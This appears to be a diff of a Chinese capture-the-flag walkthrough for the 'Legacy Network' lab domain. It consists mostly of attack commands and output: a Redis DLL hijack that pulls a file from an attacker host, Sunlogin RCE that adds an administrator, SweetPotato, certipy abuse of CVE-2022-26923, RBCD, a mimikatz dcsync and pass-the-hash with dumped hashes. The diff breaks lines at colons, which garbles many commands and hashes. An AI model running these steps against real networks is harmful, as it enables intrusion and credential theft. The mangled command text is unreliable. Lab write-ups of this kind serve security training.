@@ -23,10 +23,13 @@ flag1
 fscan只扫到一个redis未授权，Another Redis Desktop Manager连上去发现是redis 3的版本，Windows系统
 
 start infoscan
-39.98.125.24:6379 open
+39.98.125.24:
+6379 open
 [*] alive ports len is: 1
 start vulscan
-[+] Redis 39.98.125.24:6379 unauthorized file:C:Program FilesRedis/dump.rdb
+[+] Redis 39.98.125.24:
+6379 unauthorized file:C:
+Program FilesRedis/dump.rdb
 已完成 1/1
 [*] 扫描结束,耗时: 10.1216089s
 
@@ -71,19 +74,32 @@ start infoscan
 (icmp) Target 172.22.12.31    is alive
 [*] Icmp alive hosts len is: 4
 172.22.12.6:88 open
-172.22.12.25:6379 open
-172.22.12.31:445 open
-172.22.12.25:445 open
-172.22.12.12:445 open
-172.22.12.6:445 open
-172.22.12.31:139 open
-172.22.12.25:139 open
-172.22.12.12:139 open
-172.22.12.6:139 open
-172.22.12.31:135 open
-172.22.12.25:135 open
-172.22.12.12:135 open
-172.22.12.6:135 open
+172.22.12.25:
+6379 open
+172.22.12.31:
+445 open
+172.22.12.25:
+445 open
+172.22.12.12:
+445 open
+172.22.12.6:
+445 open
+172.22.12.31:
+139 open
+172.22.12.25:
+139 open
+172.22.12.12:
+139 open
+172.22.12.6:
+139 open
+172.22.12.31:
+135 open
+172.22.12.25:
+135 open
+172.22.12.12:
+135 open
+172.22.12.6:
+135 open
 172.22.12.31:80 open
 172.22.12.12:80 open
 172.22.12.31:21 open
@@ -101,7 +117,8 @@ start vulscan
 [*]172.22.12.12
    [->]WIN-AUTHORITY
    [->]172.22.12.12
-[*] NetBios 172.22.12.6     [+] DC:WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
+[*] NetBios 172.22.12.6     [+] DC:
+WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
 [*] NetInfo
 [*]172.22.12.6
    [->]WIN-SERVER
@@ -109,12 +126,21 @@ start vulscan
 [*] NetBios 172.22.12.31    WORKGROUPWIN-IISQE3PC
 [*] NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server 2016 Datacenter 14393
 [*] OsInfo 172.22.12.6  (Windows Server 2016 Standard 14393)
-[+] ftp 172.22.12.31:21:anonymous 
+[+] ftp 172.22.12.31:21:
+anonymous 
    [->]SunloginClient_11.0.0.33826_x64.exe
-[*] WebTitle http://172.22.12.31       code:200 len:703    title:IIS Windows Server
-[*] WebTitle http://172.22.12.12       code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.12.31       code:
+200 len:
+703    title:
+IIS Windows Server
+[*] WebTitle http://172.22.12.12       code:
+200 len:
+703    title:
+IIS Windows Server
 [+] PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect 
-[+] Redis 172.22.12.25:6379 unauthorized file:C:Program FilesRedis/dump.rdb
+[+] Redis 172.22.12.25:
+6379 unauthorized file:C:
+Program FilesRedis/dump.rdb
 已完成 17/17
 [*] 扫描结束,耗时: 14.3460105s
 
@@ -137,7 +163,8 @@ sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "whoami"
 sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net user simho whoami@123 /add"
 sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net localgroup administrators simho /add"
 
-sunRce.exe -h 172.22.12.31  -t rce -p 49686 -c "type C:UsersAdministratorflagflag02.txt"
+sunRce.exe -h 172.22.12.31  -t rce -p 49686 -c "type C:
+UsersAdministratorflagflag02.txt"
 
 flag{29a46b72-8a82-182a-45f3-532475ec6fd4}
 
@@ -250,25 +277,39 @@ flag3
 
 在域控那台机器添加管理员账号，rdp连接上去后，将mimikatz.exe放到System32文件夹下，然后以system权限导哈希
 
-mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
+mimikatz.exe "lsadump::
+dcsync /domain:
+xiaorang.lab /all /csv" "exit"
 
 或者学c1trus师傅用SAM转储
 
 proxychains4 impacket-secretsdump 'xiaorang.lab/administrator@win-server.xiaorang.lab' -target-ip 172.22.12.6 -no-pass -k
 
 ......
-[*] Dumping Domain Credentials (domainuid:rid:lmhash:nthash)
+[*] Dumping Domain Credentials (domainuid:
+rid:
+lmhash:
+nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:135  ...  OK
-[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:49667  ...  OK
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13:::
+[proxychains] Strict chain  ...  39.98.117.52:
+10086  ...  172.22.12.6:
+135  ...  OK
+[proxychains] Strict chain  ...  39.98.117.52:
+10086  ...  172.22.12.6:
+49667  ...  OK
+Administrator:
+500:
+aad3b435b51404eeaad3b435b51404ee:
+aa95e708a5182931157a526acf769b13:::
 ......
 
 接着PTH到172.22.12.12机器拿最后一个flag
 
-proxychains4 impacket-smbexec -hashes :aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk
+proxychains4 impacket-smbexec -hashes :
+aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk
 
-type C:UsersAdministratorflag03.txt
+type C:
+UsersAdministratorflag03.txt
 
 flag{317621a6-bb66-4154-b157-365c871d52d2}
 
@@ -291,52 +332,25 @@ ChaMd5 Venom 招收大佬入圈
 
 ```
 Legacy Network 是一家在信息技术领域拥有 20 年历史的老牌企业，专注于为中小型公司提供IT解决方案和支持服务。由于长期依赖于过时的基础设施和内部网络，Legacy Network 在现代化的安全防护体系方面存在许多不足，特别是在权限控制、过时的软件、未及时更新补丁等方面存在显著问题。你的目标是通过渗透进入该网络，获取每台机器的权限，该靶场共有 4个Flag，分布于不同的靶机。
-```
-
-
-
-```
 redis dll劫持上线cs马
 向日葵 RCE
 SeImpersonatePrivilege配合甜土豆提权
 Active Directory域权限提升漏洞（CVE-2022-26923）
 passthecert打RBCD攻击
 哈希传递
-```
-
-
-
-```
 start infoscan
-39.98.125.24:6379 open
+39.98.125.24:
+6379 open
 [*] alive ports len is: 1
 start vulscan
-[+] Redis 39.98.125.24:6379 unauthorized file:C:Program FilesRedis/dump.rdb
+[+] Redis 39.98.125.24:
+6379 unauthorized file:C:
+Program FilesRedis/dump.rdb
 已完成 1/1
 [*] 扫描结束,耗时: 10.1216089s
-```
-
-
-
-```
 python3 DllHijacker.py dbghelp.dll
-```
-
-
-
-```
 python3 RedisWriteFile.py --rhost 39.98.117.52 --rport 6379 --lhost 8.138.89.236  --lport 16379 --rpath 'C:\Program Files\Redis\' --rfile 'dbghelp.dll' --lfile 'dbghelp.dll'
-```
-
-
-
-```
 flag{58455a83-7516-4a8f-92bf-ca94e7aa33a0}
-```
-
-
-
-```
 start infoscan
 (icmp) Target 172.22.12.6     is alive
 (icmp) Target 172.22.12.12    is alive
@@ -344,19 +358,32 @@ start infoscan
 (icmp) Target 172.22.12.31    is alive
 [*] Icmp alive hosts len is: 4
 172.22.12.6:88 open
-172.22.12.25:6379 open
-172.22.12.31:445 open
-172.22.12.25:445 open
-172.22.12.12:445 open
-172.22.12.6:445 open
-172.22.12.31:139 open
-172.22.12.25:139 open
-172.22.12.12:139 open
-172.22.12.6:139 open
-172.22.12.31:135 open
-172.22.12.25:135 open
-172.22.12.12:135 open
-172.22.12.6:135 open
+172.22.12.25:
+6379 open
+172.22.12.31:
+445 open
+172.22.12.25:
+445 open
+172.22.12.12:
+445 open
+172.22.12.6:
+445 open
+172.22.12.31:
+139 open
+172.22.12.25:
+139 open
+172.22.12.12:
+139 open
+172.22.12.6:
+139 open
+172.22.12.31:
+135 open
+172.22.12.25:
+135 open
+172.22.12.12:
+135 open
+172.22.12.6:
+135 open
 172.22.12.31:80 open
 172.22.12.12:80 open
 172.22.12.31:21 open
@@ -374,7 +401,8 @@ start vulscan
 [*]172.22.12.12
    [->]WIN-AUTHORITY
    [->]172.22.12.12
-[*] NetBios 172.22.12.6     [+] DC:WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
+[*] NetBios 172.22.12.6     [+] DC:
+WIN-SERVER.xiaorang.lab       Windows Server 2016 Standard 14393
 [*] NetInfo
 [*]172.22.12.6
    [->]WIN-SERVER
@@ -382,61 +410,36 @@ start vulscan
 [*] NetBios 172.22.12.31    WORKGROUPWIN-IISQE3PC
 [*] NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server 2016 Datacenter 14393
 [*] OsInfo 172.22.12.6  (Windows Server 2016 Standard 14393)
-[+] ftp 172.22.12.31:21:anonymous 
+[+] ftp 172.22.12.31:21:
+anonymous 
    [->]SunloginClient_11.0.0.33826_x64.exe
-[*] WebTitle http://172.22.12.31       code:200 len:703    title:IIS Windows Server
-[*] WebTitle http://172.22.12.12       code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.12.31       code:
+200 len:
+703    title:
+IIS Windows Server
+[*] WebTitle http://172.22.12.12       code:
+200 len:
+703    title:
+IIS Windows Server
 [+] PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect 
-[+] Redis 172.22.12.25:6379 unauthorized file:C:Program FilesRedis/dump.rdb
+[+] Redis 172.22.12.25:
+6379 unauthorized file:C:
+Program FilesRedis/dump.rdb
 已完成 17/17
 [*] 扫描结束,耗时: 14.3460105s
-```
-
-
-
-```
 sunRce.exe -t scan -h 172.22.12.31 -p 40000-50000
-```
-
-
-
-```
 sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "whoami"
-```
-
-
-
-```
 sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net user simho whoami@123 /add"
 sunRce.exe -h 172.22.12.31  -t rce -p 49688 -c "net localgroup administrators simho /add"
 
-sunRce.exe -h 172.22.12.31  -t rce -p 49686 -c "type C:UsersAdministratorflagflag02.txt"
-```
-
-
-
-```
+sunRce.exe -h 172.22.12.31  -t rce -p 49686 -c "type C:
+UsersAdministratorflagflag02.txt"
 flag{29a46b72-8a82-182a-45f3-532475ec6fd4}
-```
-
-
-
-```
 C:/Users/Public/sweetpotato.exe -a "whoami"
-```
-
-
-
-```
 * Username : WIN-YUYAOX9Q$
 * Domain   : XIAORANG
 * NTLM     : e611213c6a712f9b18a8d056005a4f0f
 * SHA1     : 1a8d2c95320592037c0fa583c1f62212d4ff8ce9
-```
-
-
-
-```
 [*] Action: Find certificate templates
 [*] Using the search base 'CN=Configuration,DC=xiaorang,DC=lab'
 
@@ -465,116 +468,50 @@ C:/Users/Public/sweetpotato.exe -a "whoami"
     Enrollment Agent Restrictions : None
 
 [+] No Vulnerable Certificates Templates found!
-```
-
-
-
-```
 172.22.12.6 WIN-SERVER.xiaorang.lab
 172.22.12.12 WIN-AUTHORITY.xiaorang.lab
-```
-
-
-
-```
 proxychains4 certipy account create -u WIN-YUYAOX9Q$ -hashes e611213c6a712f9b18a8d056005a4f0f  -dc-ip 172.22.12.6 -user simho -dns WIN-SERVER.xiaorang.lab -debug
-```
-
-
-
-```
 simho$/YNj8hDLLR82VNLZq
-```
-
-
-
-```
 proxychains4 certipy req -u 'simho$@xiaorang.lab' -p 'YNj8hDLLR82VNLZq' -ca 'xiaorang-WIN-AUTHORITY-CA' -target 172.22.12.12 -template 'Machine' -debug -dc-ip 172.22.12.6
 
 proxychains4 certipy auth -pfx win-server.pfx -dc-ip 172.22.12.6 -debug
-```
-
-
-
-```
 openssl pkcs12 -in win-server.pfx -nodes -out win-server.pem
 openssl rsa -in win-server.pem -out win-server.key
 openssl x509 -in win-server.pem -out win-server.crt
 proxychains4 certipy cert -pfx win-server.pfx -nokey -out win-server.crt
 proxychains4 certipy cert -pfx win-server.pfx -nocert -out win-server.key
-```
-
-
-
-```
 proxychains4 python3 passthecert.py -action whoami -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6
-```
-
-
-
-```
 proxychains4 python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to 'win-server$' -delegate-from 'simho$'
-```
-
-
-
-```
 proxychains4 impacket-getST xiaorang.lab/'simho$':'YNj8hDLLR82VNLZq' -spn cifs/WIN-SERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6
-```
-
-
-
-```
 export KRB5CCNAME=Administrator.ccache
-```
-
-
-
-```
 proxychains4 impacket-psexec Administrator@WIN-SERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6
-```
-
-
-
-```
 flag{4c7d6e81-3161-4853-b93f-349ab74a60e5}
-```
-
-
-
-```
-mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
-```
-
-
-
-```
+mimikatz.exe "lsadump::
+dcsync /domain:
+xiaorang.lab /all /csv" "exit"
 proxychains4 impacket-secretsdump 'xiaorang.lab/administrator@win-server.xiaorang.lab' -target-ip 172.22.12.6 -no-pass -k
-```
-
-
-
-```
 ......
-[*] Dumping Domain Credentials (domainuid:rid:lmhash:nthash)
+[*] Dumping Domain Credentials (domainuid:
+rid:
+lmhash:
+nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:135  ...  OK
-[proxychains] Strict chain  ...  39.98.117.52:10086  ...  172.22.12.6:49667  ...  OK
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13:::
+[proxychains] Strict chain  ...  39.98.117.52:
+10086  ...  172.22.12.6:
+135  ...  OK
+[proxychains] Strict chain  ...  39.98.117.52:
+10086  ...  172.22.12.6:
+49667  ...  OK
+Administrator:
+500:
+aad3b435b51404eeaad3b435b51404ee:
+aa95e708a5182931157a526acf769b13:::
 ......
-```
+proxychains4 impacket-smbexec -hashes :
+aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk
 
-
-
-```
-proxychains4 impacket-smbexec -hashes :aa95e708a5182931157a526acf769b13 xiaorang.lab/administrator@172.22.12.12 -codec gbk
-
-type C:UsersAdministratorflag03.txt
-```
-
-
-
-```
+type C:
+UsersAdministratorflag03.txt
 flag{317621a6-bb66-4154-b157-365c871d52d2}
 ```
 
